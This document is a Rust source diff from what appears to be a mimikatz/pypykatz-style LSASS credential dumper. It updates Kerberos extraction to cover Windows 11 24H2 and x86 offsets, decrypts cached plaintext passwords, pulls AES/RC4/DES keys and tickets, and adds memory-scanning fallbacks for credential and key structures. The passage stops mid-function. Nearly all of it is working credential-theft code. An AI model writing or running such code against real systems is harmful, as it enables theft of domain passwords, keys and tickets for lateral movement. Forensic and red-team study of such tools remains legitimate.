@@ -1,18 +1,16 @@
 use crate::error::Result;
 use crate::lsass::crypto::CryptoKeys;
 use crate::lsass::patterns;
-use crate::lsass::types::{KerberosCredential, KerberosKey, KerberosTicket, KerberosTicketType};
+use crate::lsass::types::{Arch, KerberosCredential, KerberosKey, KerberosTicket, KerberosTicketType, read_ptr, read_ustring, is_valid_user_ptr};
 use crate::memory::VirtualMemory;
 use crate::pe::parser::PeHeaders;
 
-/// Kerberos session offsets per Windows version (x64).
-/// KerbGlobalLogonSessionTable is an RTL_AVL_TABLE (since Vista).
-/// Each AVL tree node has RTL_BALANCED_LINKS (0x20 bytes) header,
-/// followed by the session entry data.
+/// Kerberos session offsets per Windows version.
+/// AVL OrderedPointer at node+0x20 (x64) / +0x10 (x86) points to session data.
 struct KerbOffsets {
-    avl_node_data_offset: u64,
     luid: u64,
-    credentials_ptr: u64,
+    /// Offset to inline KIWI_KERBEROS_PRIMARY_CREDENTIAL (not a pointer)
+    credentials: u64,
     /// Password offset within KIWI_KERBEROS_PRIMARY_CREDENTIAL
     cred_password: u64,
     /// Pointer to KIWI_KERBEROS_KEYS_LIST_6 (AES/DES keys)
@@ -46,10 +44,8 @@ pub const KEY_ENTRY_PRE1607: KerbKeyEntryOffsets = KerbKeyEntryOffsets {
 };
 
 /// Offsets within KIWI_KERBEROS_INTERNAL_TICKET (per version).
-#[allow(dead_code)]
 struct TicketOffsets {
     service_name_ptr: u64,
-    target_name_ptr: u64,
     domain_name: u64,
     target_domain_name: u64,
     client_name_ptr: u64,
@@ -68,22 +64,31 @@ struct TicketOffsets {
 
 /// Multiple offset variants for different Windows versions.
 const KERB_OFFSET_VARIANTS: &[KerbOffsets] = &[
-    // Win10 1607+ / Win11: KIWI_KERBEROS_LOGON_SESSION_10_1607
+    // Win10 1607+ / Win11 (pre-24H2): KIWI_KERBEROS_LOGON_SESSION_10_1607
     KerbOffsets {
-        avl_node_data_offset: 0x20,
         luid: 0x48,
-        credentials_ptr: 0x88,
+        credentials: 0x88,
         cred_password: 0x30,
         key_list_ptr: 0x118,
         tickets_1: 0x128,
         tickets_2: 0x140,
         tickets_3: 0x158,
     },
+    // Win11 24H2+: KIWI_KERBEROS_LOGON_SESSION_10_1607 without unk13 PVOID
+    // All offsets shift -0x10 from variant 0 (unk13 removed, unk1 changed from PVOID to ULONG)
+    KerbOffsets {
+        luid: 0x40,
+        credentials: 0x78,
+        cred_password: 0x30,
+        key_list_ptr: 0x108,
+        tickets_1: 0x118,
+        tickets_2: 0x130,
+        tickets_3: 0x148,
+    },
     // Win10 1507-1511: KIWI_KERBEROS_LOGON_SESSION_10
     KerbOffsets {
-        avl_node_data_offset: 0x20,
         luid: 0x48,
-        credentials_ptr: 0x88,
+        credentials: 0x88,
         cred_password: 0x28,
         key_list_ptr: 0x108,
         tickets_1: 0x118,
@@ -92,9 +97,8 @@ const KERB_OFFSET_VARIANTS: &[KerbOffsets] = &[
     },
     // Win8/8.1: KIWI_KERBEROS_LOGON_SESSION (session_10 variant)
     KerbOffsets {
-        avl_node_data_offset: 0x20,
         luid: 0x40,
-        credentials_ptr: 0x80,
+        credentials: 0x80,
         cred_password: 0x28,
         key_list_ptr: 0xD8,
         tickets_1: 0xE8,
@@ -103,9 +107,8 @@ const KERB_OFFSET_VARIANTS: &[KerbOffsets] = &[
     },
     // Win7: KIWI_KERBEROS_LOGON_SESSION
     KerbOffsets {
-        avl_node_data_offset: 0x20,
         luid: 0x18,
-        credentials_ptr: 0x50,
+        credentials: 0x50,
         cred_password: 0x28,
         key_list_ptr: 0x90,
         tickets_1: 0xA0,
@@ -117,7 +120,7 @@ const KERB_OFFSET_VARIANTS: &[KerbOffsets] = &[
 /// Ticket structure offsets for Win10 1607+ (KIWI_KERBEROS_INTERNAL_TICKET_10_1607).
 const TICKET_OFFSETS_1607: TicketOffsets = TicketOffsets {
     service_name_ptr: 0x20,
-    target_name_ptr: 0x28,
+
     domain_name: 0x30,
     target_domain_name: 0x40,
     client_name_ptr: 0x90,
@@ -138,7 +141,7 @@ const TICKET_OFFSETS_1607: TicketOffsets = TicketOffsets {
 /// Same as _6 but with KDCServer+unk10586_d LSA_UNICODE_STRINGs before ClientName.
 const TICKET_OFFSETS_10: TicketOffsets = TicketOffsets {
     service_name_ptr: 0x20,
-    target_name_ptr: 0x28,
+
     domain_name: 0x30,
     target_domain_name: 0x40,
     client_name_ptr: 0x90,
@@ -159,7 +162,7 @@ const TICKET_OFFSETS_10: TicketOffsets = TicketOffsets {
 /// No KDCServer/unk10586_d fields, smaller layout.
 const TICKET_OFFSETS_6: TicketOffsets = TicketOffsets {
     service_name_ptr: 0x20,
-    target_name_ptr: 0x28,
+
     domain_name: 0x30,
     target_domain_name: 0x40,
     client_name_ptr: 0x80,
@@ -176,9 +179,84 @@ const TICKET_OFFSETS_6: TicketOffsets = TicketOffsets {
     ticket_value: 0x108,
 };
 
+// -- x86 offset variants --
+
+/// x86 Kerberos session offsets (estimated from x64 struct layout with 4-byte pointers).
+/// Auto-detection validates LUID + username at runtime.
+const KERB_OFFSET_VARIANTS_X86: &[KerbOffsets] = &[
+    // Win10 1607+ x86
+    KerbOffsets {
+        luid: 0x24,
+        credentials: 0x50,
+        cred_password: 0x18,
+        key_list_ptr: 0x8C,
+        tickets_1: 0x94,
+        tickets_2: 0xA0,
+        tickets_3: 0xAC,
+    },
+    // Win10 1507-1511 x86
+    KerbOffsets {
+        luid: 0x24,
+        credentials: 0x50,
+        cred_password: 0x14,
+        key_list_ptr: 0x84,
+        tickets_1: 0x8C,
+        tickets_2: 0x98,
+        tickets_3: 0xA4,
+    },
+];
+
+/// x86 key entry offsets (SIZE_T=4, PVOID=4).
+const KEY_ENTRY_1607_X86: KerbKeyEntryOffsets = KerbKeyEntryOffsets {
+    entry_size: 0x20, // salt(USTRING 8) + stringToKey(PVOID 4) + void2(PVOID 4) + generic(0x10)
+    generic_offset: 0x10,
+};
+const KEY_ENTRY_PRE1607_X86: KerbKeyEntryOffsets = KerbKeyEntryOffsets {
+    entry_size: 0x1C, // salt(USTRING 8) + stringToKey(PVOID 4) + generic(0x10)
+    generic_offset: 0x0C,
+};
+
+/// x86 ticket structure offsets (Win10 1607+).
+const TICKET_OFFSETS_1607_X86: TicketOffsets = TicketOffsets {
+    service_name_ptr: 0x10,
+    domain_name: 0x18,
+    target_domain_name: 0x20,
+    client_name_ptr: 0x48,
+    ticket_flags: 0x50,
+    key_type: 0x5C,
+    key_length: 0x60,
+    key_value: 0x64,
+    start_time: 0x78,
+    end_time: 0x80,
+    renew_until: 0x88,
+    ticket_enc_type: 0x9C,
+    ticket_kvno: 0xA0,
+    ticket_length: 0xA4,
+    ticket_value: 0xA8,
+};
+
+/// x86 ticket structure offsets (Win10 1507-1511, no KDCServer/unk10586_d).
+const TICKET_OFFSETS_10_X86: TicketOffsets = TicketOffsets {
+    service_name_ptr: 0x10,
+    domain_name: 0x18,
+    target_domain_name: 0x20,
+    client_name_ptr: 0x38,
+    ticket_flags: 0x40,
+    key_type: 0x4C,
+    key_length: 0x50,
+    key_value: 0x54,
+    start_time: 0x68,
+    end_time: 0x70,
+    renew_until: 0x78,
+    ticket_enc_type: 0x8C,
+    ticket_kvno: 0x90,
+    ticket_length: 0x94,
+    ticket_value: 0x98,
+};
+
 /// Extract Kerberos credentials from kerberos.dll.
-pub fn extract_kerberos_credentials(
-    vmem: &impl VirtualMemory,
+fn extract_kerberos_credentials(
+    vmem: &dyn VirtualMemory,
     kerberos_base: u64,
     _kerberos_size: u32,
     keys: &CryptoKeys,
@@ -242,35 +320,76 @@ pub fn extract_kerberos_credentials(
     // Auto-detect offset variant
     let (offsets, variant_idx) = detect_kerb_offsets(vmem, &nodes);
     let ticket_offsets = match variant_idx {
-        0 => &TICKET_OFFSETS_1607,
-        1 => &TICKET_OFFSETS_10,
-        _ => &TICKET_OFFSETS_6,
+        0 | 1 => &TICKET_OFFSETS_1607, // Win10 1607+ and Win11 24H2+
+        2 => &TICKET_OFFSETS_10,        // Win10 1507-1511
+        _ => &TICKET_OFFSETS_6,         // Win8/8.1, Win7
     };
 
     for node_ptr in &nodes {
-        let entry = node_ptr + offsets.avl_node_data_offset;
+        // Each AVL node has RTL_BALANCED_LINKS (0x20 bytes) followed by an
+        // OrderedPointer (PVOID at +0x20) that points to the session data.
+        let entry = match vmem.read_virt_u64(node_ptr + 0x20) {
+            Ok(p) if p > 0x10000 && (p >> 48) == 0 => p,
+            _ => {
+                log::debug!(
+                    "Kerberos AVL node 0x{:x}: OrderedPointer unreadable (skipped)",
+                    node_ptr
+                );
+                continue;
+            }
+        };
         let luid = vmem.read_virt_u64(entry + offsets.luid).unwrap_or(0);
-        let cred_ptr = vmem
-            .read_virt_u64(entry + offsets.credentials_ptr)
-            .unwrap_or(0);
 
-        if cred_ptr == 0 || luid == 0 {
+        if luid == 0 {
             log::debug!(
-                "Kerberos AVL node 0x{:x}: luid=0x{:x} cred_ptr=0x{:x} (skipped)",
+                "Kerberos AVL node 0x{:x}: entry=0x{:x} luid=0 (skipped)",
                 node_ptr,
-                luid,
-                cred_ptr
+                entry,
             );
             continue;
         }
 
-        let username = vmem.read_win_unicode_string(cred_ptr).unwrap_or_default();
+        // Valid LUIDs are 32-bit values (upper 32 bits must be zero)
+        if luid > 0xFFFF_FFFF {
+            log::debug!(
+                "Kerberos AVL node 0x{:x}: entry=0x{:x} luid=0x{:x} out of range (skipped)",
+                node_ptr,
+                entry,
+                luid
+            );
+            continue;
+        }
+
+        // Credentials are inline at entry + credentials offset
+        let cred_addr = entry + offsets.credentials;
+        let username = vmem.read_win_unicode_string(cred_addr).unwrap_or_default();
         let domain = vmem
-            .read_win_unicode_string(cred_ptr + 0x10)
+            .read_win_unicode_string(cred_addr + 0x10)
             .unwrap_or_default();
 
+        // Reject entries with corrupted usernames (garbage memory interpreted as UTF-16)
+        if !username.is_empty() && !is_plausible_username(&username) {
+            log::debug!(
+                "Kerberos AVL node 0x{:x}: luid=0x{:x} username {:?} looks corrupted (skipped)",
+                node_ptr,
+                luid,
+                username
+            );
+            continue;
+        }
+
         let password = if !username.is_empty() {
-            extract_kerb_password(vmem, cred_ptr, offsets.cred_password, keys).unwrap_or_default()
+            match extract_kerb_password(vmem, cred_addr, offsets.cred_password, keys) {
+                Ok(p) => p,
+                Err(e) => {
+                    log::debug!(
+                        "Kerberos password extraction failed for luid=0x{:x}: {}",
+                        luid,
+                        e
+                    );
+                    String::new()
+                }
+            }
         } else {
             String::new()
         };
@@ -279,7 +398,7 @@ pub fn extract_kerberos_credentials(
         // Keys live in the session entry, not the credential, so they may be
         // available even when the credential substructure is paged out.
         let key_entry_offsets = match variant_idx {
-            0 => &KEY_ENTRY_1607,
+            0 | 1 => &KEY_ENTRY_1607, // Win10 1607+ and Win11 24H2+
             _ => &KEY_ENTRY_PRE1607,
         };
         let kerb_keys = extract_kerb_keys(vmem, entry, offsets, key_entry_offsets, keys);
@@ -298,10 +417,10 @@ pub fn extract_kerberos_credentials(
         // Skip nodes that have nothing useful (credential paged out AND no keys/tickets)
         if username.is_empty() && kerb_keys.is_empty() && tickets.is_empty() {
             log::debug!(
-                "Kerberos AVL node 0x{:x}: luid=0x{:x} cred_ptr=0x{:x} fully paged out",
+                "Kerberos AVL node 0x{:x}: luid=0x{:x} entry=0x{:x} fully paged out",
                 node_ptr,
                 luid,
-                cred_ptr
+                entry
             );
             continue;
         }
@@ -319,8 +438,8 @@ pub fn extract_kerberos_credentials(
         results.push((
             luid,
             KerberosCredential {
-                username: username.clone(),
-                domain: domain.clone(),
+                username,
+                domain,
                 password,
                 keys: kerb_keys,
                 tickets,
@@ -332,13 +451,8 @@ pub fn extract_kerberos_credentials(
 }
 
 /// Extract Kerberos encryption keys (AES128, AES256, RC4, DES) from pKeyList.
-/// The pKeyList pointer in the session entry points to a KIWI_KERBEROS_KEYS_LIST_6:
-///   +0x00: unk0 (DWORD)
-///   +0x04: cbItem (DWORD) - number of key entries
-///   +0x08..+0x27: padding/unknown
-///   +0x28: array of KERB_HASHPASSWORD_6[_1607] entries
 fn extract_kerb_keys(
-    vmem: &impl VirtualMemory,
+    vmem: &dyn VirtualMemory,
     entry: u64,
     offsets: &KerbOffsets,
     key_entry_offsets: &KerbKeyEntryOffsets,
@@ -362,8 +476,12 @@ fn extract_kerb_keys(
         let entry_base = entries_base + (i as u64) * key_entry_offsets.entry_size;
         let generic_base = entry_base + key_entry_offsets.generic_offset;
 
-        // KERB_HASHPASSWORD_GENERIC: Type (u32), pad, Size (u64), Checksump (u64)
-        let etype = match vmem.read_virt_u32(generic_base) {
+        // KERB_HASHPASSWORD_GENERIC layout on x64:
+        //   +0x00: unk (u32, always 2)
+        //   +0x04: Type (u32, encryption type / etype)
+        //   +0x08: Size (u64)
+        //   +0x10: Checksump (u64, pointer to encrypted key data)
+        let etype = match vmem.read_virt_u32(generic_base + 0x04) {
             Ok(t) => t,
             Err(_) => continue,
         };
@@ -386,13 +504,19 @@ fn extract_kerb_keys(
             Err(_) => continue,
         };
 
-        // Validate key size matches expected for this etype
+        // Validate etype is a known Windows encryption type.
+        // Unknown etypes indicate garbage data (corrupt key list entry).
         let expected_len = match etype {
-            17 => 16, // AES128
-            18 => 32, // AES256
-            23 => 16, // RC4/NTLM
-            3 | 1 => 8, // DES
-            _ => decrypted.len(),
+            17 => 16,                              // AES128_CTS_HMAC_SHA1
+            18 => 32,                              // AES256_CTS_HMAC_SHA1
+            23 | 24 => 16,                         // RC4_HMAC / RC4_HMAC_EXP
+            3 | 1 => 8,                            // DES_CBC_MD5 / DES_CBC_CRC
+            0xFFFF_FF7B | 0xFFFF_FF79 => 16,       // RC4_HMAC_OLD (-133) / DES_PLAIN (-135)
+            0xFFFF_FF80 | 0xFFFF_FF74 => 16,       // RC4_HMAC_OLD_EXP (-128) / RC4_MD4 (-140)
+            _ => {
+                log::debug!("  Skipping unknown Kerberos etype {:#x}", etype);
+                continue;
+            }
         };
         if decrypted.len() < expected_len {
             continue;
@@ -401,6 +525,13 @@ fn extract_kerb_keys(
 
         // Skip all-zero keys
         if key_bytes.iter().all(|&b| b == 0) {
+            continue;
+        }
+
+        // Skip repeating-pattern garbage (decryption artifacts from paged/corrupt data).
+        // Real AES/RC4/DES keys never have short repeating cycles (p ≈ 2^-64).
+        if super::msv::is_repeating_pattern_pub(&key_bytes) {
+            log::debug!("  Skipping garbage Kerberos key (repeating pattern): etype={}", etype);
             continue;
         }
 
@@ -429,7 +560,7 @@ fn extract_kerb_keys(
 
 /// Walk a doubly-linked ticket list and extract each ticket.
 fn extract_tickets_from_list(
-    vmem: &impl VirtualMemory,
+    vmem: &dyn VirtualMemory,
     list_head: u64,
     ticket_type: KerberosTicketType,
     offsets: &TicketOffsets,
@@ -465,7 +596,7 @@ fn extract_tickets_from_list(
 
 /// Extract a single Kerberos ticket from a KIWI_KERBEROS_INTERNAL_TICKET struct.
 fn extract_single_ticket(
-    vmem: &impl VirtualMemory,
+    vmem: &dyn VirtualMemory,
     ticket_addr: u64,
     ticket_type: KerberosTicketType,
     offsets: &TicketOffsets,
@@ -622,7 +753,7 @@ fn extract_single_ticket(
 }
 
 /// Read KERB_EXTERNAL_NAME structure: NameType (i16), NameCount (u16), Names (LSA_UNICODE_STRING[]).
-fn read_kerb_external_name(vmem: &impl VirtualMemory, ptr: u64) -> (Vec<String>, i16) {
+fn read_kerb_external_name(vmem: &dyn VirtualMemory, ptr: u64) -> (Vec<String>, i16) {
     if ptr == 0 || (ptr >> 48) != 0 {
         return (Vec::new(), 0);
     }
@@ -643,7 +774,7 @@ fn read_kerb_external_name(vmem: &impl VirtualMemory, ptr: u64) -> (Vec<String>,
 
 /// Walk an AVL tree (in-order traversal) collecting all node pointers.
 fn walk_avl_tree(
-    vmem: &impl VirtualMemory,
+    vmem: &dyn VirtualMemory,
     node: u64,
     sentinel: u64,
     results: &mut Vec<u64>,
@@ -662,12 +793,31 @@ fn walk_avl_tree(
     walk_avl_tree(vmem, right, sentinel, results, depth + 1);
 }
 
+/// Check if a username looks plausible (not garbage memory).
+/// Allows any printable Unicode (Latin, CJK, Cyrillic, Arabic, etc.)
+/// but rejects control characters and private-use/surrogate codepoints.
+fn is_plausible_username(name: &str) -> bool {
+    if name.is_empty() {
+        return false;
+    }
+    // Reject control characters (U+0000..U+001F except tab/space, U+007F..U+009F)
+    // and private-use area (U+E000..U+F8FF) which indicate garbage memory.
+    // Allow everything else: Latin, CJK, Cyrillic, Arabic, Hangul, etc.
+    name.chars().all(|c| {
+        !c.is_control() && !('\u{E000}'..='\u{F8FF}').contains(&c)
+    })
+}
+
 /// Auto-detect Kerberos offset variant by probing AVL tree nodes.
 /// Returns the offsets and variant index.
-fn detect_kerb_offsets(vmem: &impl VirtualMemory, nodes: &[u64]) -> (&'static KerbOffsets, usize) {
+fn detect_kerb_offsets(vmem: &dyn VirtualMemory, nodes: &[u64]) -> (&'static KerbOffsets, usize) {
     for node_ptr in nodes {
+        // Dereference OrderedPointer at node+0x20 to get the session data address
+        let entry = match vmem.read_virt_u64(node_ptr + 0x20) {
+            Ok(p) if p > 0x10000 && (p >> 48) == 0 => p,
+            _ => continue,
+        };
         for (idx, variant) in KERB_OFFSET_VARIANTS.iter().enumerate() {
-            let entry = node_ptr + variant.avl_node_data_offset;
             let luid = match vmem.read_virt_u64(entry + variant.luid) {
                 Ok(l) => l,
                 Err(_) => continue,
@@ -675,45 +825,850 @@ fn detect_kerb_offsets(vmem: &impl VirtualMemory, nodes: &[u64]) -> (&'static Ke
             if luid == 0 || luid > 0xFFFFFFFF {
                 continue;
             }
-            let cred_ptr = match vmem.read_virt_u64(entry + variant.credentials_ptr) {
-                Ok(p) => p,
-                Err(_) => continue,
-            };
-            if cred_ptr < 0x10000 || (cred_ptr >> 48) != 0 {
-                continue;
-            }
-            let username = vmem.read_win_unicode_string(cred_ptr).unwrap_or_default();
+            // Credentials are inline at entry + credentials offset
+            let cred_addr = entry + variant.credentials;
+            let username = vmem.read_win_unicode_string(cred_addr).unwrap_or_default();
             if !username.is_empty() && username.len() < 256 {
                 log::debug!(
                     "Kerberos: auto-detected variant {} (luid=0x{:x} cred=0x{:x} pwd=0x{:x})",
                     idx,
                     variant.luid,
-                    variant.credentials_ptr,
+                    variant.credentials,
                     variant.cred_password
                 );
                 return (variant, idx);
             }
         }
     }
+    log::warn!("Kerberos: could not auto-detect offset variant from {} AVL nodes, defaulting to variant 0", nodes.len());
     (&KERB_OFFSET_VARIANTS[0], 0)
 }
 
 pub fn extract_kerb_password(
-    vmem: &impl VirtualMemory,
+    vmem: &dyn VirtualMemory,
     cred_ptr: u64,
     password_offset: u64,
     keys: &CryptoKeys,
 ) -> Result<String> {
     let pwd_len = vmem.read_virt_u16(cred_ptr + password_offset)? as usize;
+    // Read MaximumLength (at +2 in UNICODE_STRING) for the encrypted blob size.
+    // Cipher selection depends on blob size: size%8==0 → 3DES, else → AES-CFB.
+    // Using Length instead of MaxLength would pick the wrong cipher.
+    let pwd_max_len = vmem.read_virt_u16(cred_ptr + password_offset + 2)? as usize;
     let pwd_ptr = vmem.read_virt_u64(cred_ptr + password_offset + 8)?;
+
+    log::debug!(
+        "extract_kerb_password: cred_ptr=0x{:x} offset=0x{:x} pwd_len={} max_len={} pwd_ptr=0x{:x}",
+        cred_ptr,
+        password_offset,
+        pwd_len,
+        pwd_max_len,
+        pwd_ptr
+    );
 
     if pwd_len == 0 || pwd_ptr == 0 {
         return Ok(String::new());
     }
 
-    let enc_data = vmem.read_virt_bytes(pwd_ptr, pwd_len)?;
+    // Read MaximumLength bytes (matches pypykatz's read_maxdata)
+    let read_len = if pwd_max_len >= pwd_len { pwd_max_len } else { pwd_len };
+    let enc_data = vmem.read_virt_bytes(pwd_ptr, read_len)?;
     let decrypted = crate::lsass::crypto::decrypt_credential(keys, &enc_data)?;
     Ok(crate::lsass::crypto::decode_utf16_le(&decrypted))
+}
+
+/// Scan VirtualMemory regions for KIWI_KERBEROS_PRIMARY_CREDENTIAL structures.
+/// Used as fallback when the AVL tree walk fails or returns empty.
+/// Unlike the physical scan in finder.rs, this works on any VirtualMemory backend
+/// (minidumps, snapshots) and doesn't require known_users filter.
+pub fn scan_vmem_for_kerberos_credentials(
+    vmem: &dyn VirtualMemory,
+    regions: &[(u64, u64)],
+    keys: &CryptoKeys,
+    known_sessions: &std::collections::HashMap<u64, (String, String)>,
+) -> Vec<(u64, KerberosCredential)> {
+    let mut results: Vec<(u64, KerberosCredential)> = Vec::new();
+    let mut seen: std::collections::HashMap<(String, String), usize> =
+        std::collections::HashMap::new();
+    let mut candidates: Vec<u64> = Vec::new();
+
+    log::info!(
+        "Kerberos vmem scan: searching {} memory regions for credential structures...",
+        regions.len()
+    );
+
+    for &(base, size) in regions {
+        if !(0x40..=0x10_000_000).contains(&size) {
+            continue;
+        }
+        let page_data = match vmem.read_virt_bytes(base, size as usize) {
+            Ok(d) => d,
+            Err(_) => continue,
+        };
+
+        // Scan for KIWI_KERBEROS_PRIMARY_CREDENTIAL pattern:
+        //   +0x00: UserName   (UNICODE_STRING: Length u16, MaxLength u16, pad u32, Buffer u64)
+        //   +0x10: DomainName (UNICODE_STRING: same)
+        //   +0x20: unk0 (PVOID) / or Password at +0x28 for older versions
+        //   +0x30: Password   (UNICODE_STRING: encrypted) for Win10 1607+
+        for off in (0..page_data.len().saturating_sub(0x40)).step_by(8) {
+            let user_len = u16::from_le_bytes([page_data[off], page_data[off + 1]]) as usize;
+            let user_max = u16::from_le_bytes([page_data[off + 2], page_data[off + 3]]) as usize;
+            let user_pad = u32::from_le_bytes(page_data[off + 4..off + 8].try_into().unwrap());
+            let user_buf =
+                u64::from_le_bytes(page_data[off + 8..off + 16].try_into().unwrap());
+
+            if user_len == 0 || user_len > 100 || !user_len.is_multiple_of(2) {
+                continue;
+            }
+            if user_max < user_len || user_max > 0x200 || user_pad != 0 {
+                continue;
+            }
+            if user_buf < 0x10000 || (user_buf >> 48) != 0 {
+                continue;
+            }
+
+            let dom_off = off + 0x10;
+            if dom_off + 0x10 > page_data.len() {
+                continue;
+            }
+            let dom_len =
+                u16::from_le_bytes([page_data[dom_off], page_data[dom_off + 1]]) as usize;
+            let dom_max =
+                u16::from_le_bytes([page_data[dom_off + 2], page_data[dom_off + 3]]) as usize;
+            let dom_pad = u32::from_le_bytes(
+                page_data[dom_off + 4..dom_off + 8].try_into().unwrap(),
+            );
+            let dom_buf = u64::from_le_bytes(
+                page_data[dom_off + 8..dom_off + 16].try_into().unwrap(),
+            );
+
+            if dom_len == 0 || dom_len > 100 || !dom_len.is_multiple_of(2) {
+                continue;
+            }
+            if dom_max < dom_len || dom_max > 0x200 || dom_pad != 0 {
+                continue;
+            }
+            if dom_buf < 0x10000 || (dom_buf >> 48) != 0 {
+                continue;
+            }
+
+            // Check password UNICODE_STRING at +0x30 (Win10 1607+) or +0x28 (older)
+            let mut found_pwd = false;
+            for &pwd_offset in &[0x30usize, 0x28] {
+                let po = off + pwd_offset;
+                if po + 0x10 > page_data.len() {
+                    continue;
+                }
+                let pwd_len =
+                    u16::from_le_bytes([page_data[po], page_data[po + 1]]) as usize;
+                let pwd_max =
+                    u16::from_le_bytes([page_data[po + 2], page_data[po + 3]]) as usize;
+                let pwd_pad =
+                    u32::from_le_bytes(page_data[po + 4..po + 8].try_into().unwrap());
+                let pwd_buf =
+                    u64::from_le_bytes(page_data[po + 8..po + 16].try_into().unwrap());
+
+                if pwd_len == 0 || pwd_len > 0x200 || pwd_max < pwd_len || pwd_pad != 0 {
+                    continue;
+                }
+                if pwd_buf < 0x10000 || (pwd_buf >> 48) != 0 {
+                    continue;
+                }
+                // All buffer pointers should be in a similar heap region
+                let min_buf = user_buf.min(dom_buf).min(pwd_buf);
+                let max_buf = user_buf.max(dom_buf).max(pwd_buf);
+                if max_buf - min_buf > 0x100000 {
+                    continue;
+                }
+                found_pwd = true;
+                break;
+            }
+            if !found_pwd {
+                continue;
+            }
+
+            candidates.push(base + off as u64);
+        }
+    }
+
+    log::info!("Kerberos vmem scan: {} candidates found", candidates.len());
+
+    // Build known user/domain set for matching
+    let known_users: std::collections::HashSet<(String, String)> = known_sessions
+        .values()
+        .map(|(u, d)| (u.to_lowercase(), d.to_lowercase()))
+        .collect();
+    log::info!(
+        "Kerberos vmem scan: known users = {:?}",
+        known_users
+    );
+
+    let mut empty_count = 0u32;
+    let mut implausible_count = 0u32;
+    let mut no_match_count = 0u32;
+    for vaddr in &candidates {
+        let username = vmem.read_win_unicode_string(*vaddr).unwrap_or_default();
+        let domain = vmem
+            .read_win_unicode_string(*vaddr + 0x10)
+            .unwrap_or_default();
+
+        if username.is_empty() || domain.is_empty() {
+            empty_count += 1;
+            continue;
+        }
+        if !is_plausible_username(&username) {
+            implausible_count += 1;
+            continue;
+        }
+
+        // Only accept credentials matching known sessions
+        let key = (username.to_lowercase(), domain.to_lowercase());
+        if !known_users.contains(&key) {
+            if no_match_count < 10 {
+                log::debug!(
+                    "Kerberos vmem scan: candidate 0x{:x} user={:?} domain={:?} not in known_users",
+                    vaddr,
+                    username,
+                    domain,
+                );
+            }
+            no_match_count += 1;
+            continue;
+        }
+
+        // Try to decrypt password (Win10 1607+ offset first, then older)
+        let password = extract_kerb_password(vmem, *vaddr, 0x30, keys)
+            .or_else(|_| extract_kerb_password(vmem, *vaddr, 0x28, keys))
+            .unwrap_or_default();
+
+        log::info!(
+            "Kerberos credential (vmem scan): user='{}' domain='{}' password_len={}",
+            username,
+            domain,
+            password.len()
+        );
+
+        // Dedup: prefer credentials with non-empty passwords over empty ones
+        if let Some(&existing_idx) = seen.get(&key) {
+            if password.is_empty() || !results[existing_idx].1.password.is_empty() {
+                // Existing already has password or new is empty — skip
+                continue;
+            }
+            // Replace existing empty-password entry with this one
+            log::info!(
+                "Kerberos vmem scan: upgrading credential for {}/{} (was empty, now has password)",
+                username,
+                domain
+            );
+            results[existing_idx] = (
+                0,
+                KerberosCredential {
+                    username,
+                    domain,
+                    password,
+                    keys: Vec::new(),
+                    tickets: Vec::new(),
+                },
+            );
+        } else {
+            let idx = results.len();
+            seen.insert(key, idx);
+            results.push((
+                0, // LUID unknown from scan — will be matched by username+domain
+                KerberosCredential {
+                    username,
+                    domain,
+                    password,
+                    keys: Vec::new(),
+                    tickets: Vec::new(),
+                },
+            ));
+        }
+    }
+
+    log::info!(
+        "Kerberos vmem scan: {} credentials extracted (filtered: {} empty, {} implausible, {} no-match)",
+        results.len(),
+        empty_count,
+        implausible_count,
+        no_match_count,
+    );
+    results
+}
+
+/// Scan VirtualMemory regions for KIWI_KERBEROS_KEYS_LIST_6 structures.
+/// Returns extracted Kerberos keys grouped by key list (analogous to
+/// scan_phys_for_kerberos_keys but operating on VirtualMemory).
+pub fn scan_vmem_for_kerberos_keys(
+    vmem: &dyn VirtualMemory,
+    regions: &[(u64, u64)],
+    keys: &CryptoKeys,
+) -> Vec<Vec<KerberosKey>> {
+    let mut key_list_candidates: Vec<u64> = Vec::new();
+
+    log::info!(
+        "Kerberos key vmem scan: searching {} regions for key list structures...",
+        regions.len()
+    );
+
+    for &(base, size) in regions {
+        if !(0x80..=0x10_000_000).contains(&size) {
+            continue;
+        }
+        let page_data = match vmem.read_virt_bytes(base, size as usize) {
+            Ok(d) => d,
+            Err(_) => continue,
+        };
+
+        for off in (0..page_data.len().saturating_sub(0x80)).step_by(8) {
+            let cb_item =
+                u32::from_le_bytes(page_data[off + 4..off + 8].try_into().unwrap());
+            if cb_item == 0 || cb_item > 10 {
+                continue;
+            }
+
+            for &generic_off_in_entry in &[0x20usize, 0x18] {
+                let entry_off = off + 0x28;
+                let generic_off = entry_off + generic_off_in_entry;
+                if generic_off + 0x18 > page_data.len() {
+                    continue;
+                }
+
+                // Etype is at generic+0x04 (generic+0x00 is always 2, a version marker)
+                let etype = u32::from_le_bytes(
+                    page_data[generic_off + 4..generic_off + 8].try_into().unwrap(),
+                );
+                let key_size = u64::from_le_bytes(
+                    page_data[generic_off + 8..generic_off + 16]
+                        .try_into()
+                        .unwrap(),
+                );
+                let key_ptr = u64::from_le_bytes(
+                    page_data[generic_off + 16..generic_off + 24]
+                        .try_into()
+                        .unwrap(),
+                );
+
+                if !matches!(etype, 1 | 3 | 17 | 18 | 23 | 24) {
+                    continue;
+                }
+                let expected = match etype {
+                    17 => 16,
+                    18 => 32,
+                    23 | 24 => 16,
+                    1 | 3 => 8,
+                    _ => continue,
+                };
+                if key_size != expected {
+                    continue;
+                }
+                if key_ptr < 0x10000 || (key_ptr >> 48) != 0 {
+                    continue;
+                }
+
+                key_list_candidates.push(base + off as u64);
+                break;
+            }
+        }
+    }
+
+    log::info!(
+        "Kerberos key vmem scan: {} key list candidates",
+        key_list_candidates.len()
+    );
+
+    let mut all_key_groups: Vec<Vec<KerberosKey>> = Vec::new();
+    let mut seen_keys: std::collections::HashSet<Vec<u8>> = std::collections::HashSet::new();
+
+    for vaddr in &key_list_candidates {
+        let cb_item = match vmem.read_virt_u32(*vaddr + 0x04) {
+            Ok(n) if n > 0 && n <= 10 => n as usize,
+            _ => continue,
+        };
+
+        let mut key_group = Vec::new();
+        let entries_base = *vaddr + 0x28;
+
+        for key_entry in &[&KEY_ENTRY_1607, &KEY_ENTRY_PRE1607] {
+            key_group.clear();
+            let mut valid_count = 0usize;
+
+            for i in 0..cb_item {
+                let entry_base = entries_base + (i as u64) * key_entry.entry_size;
+                let generic_base = entry_base + key_entry.generic_offset;
+
+                // Etype at generic+0x04 (generic+0x00 is always 2)
+                let etype = match vmem.read_virt_u32(generic_base + 0x04) {
+                    Ok(t) => t,
+                    Err(_) => break,
+                };
+                let key_size = match vmem.read_virt_u64(generic_base + 0x08) {
